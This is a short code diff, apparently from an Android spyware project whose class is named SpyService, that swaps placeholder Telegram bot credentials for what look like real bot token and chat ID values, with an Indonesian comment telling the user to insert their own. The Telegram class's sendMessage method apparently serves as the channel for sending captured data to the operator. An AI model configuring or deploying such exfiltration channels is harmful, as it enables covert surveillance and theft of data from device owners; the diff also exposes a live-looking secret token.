@@ -591,8 +591,8 @@ class SpyService extends Service {
 class Telegram {
 
     // GANTI DENGAN TOKEN DAN CHAT ID KAMU
-    static final String TOKEN = "123456:ABCDEF_your_bot_token";
-    static final String CHAT = "123456789";
+    static final String TOKEN = "8643816101:AAGMHBPTy8aEoDh3ikfrpbGcD6j6g178B_w";
+    static final String CHAT = "8275632263";
 
     static void sendMessage(String text) {
         try {
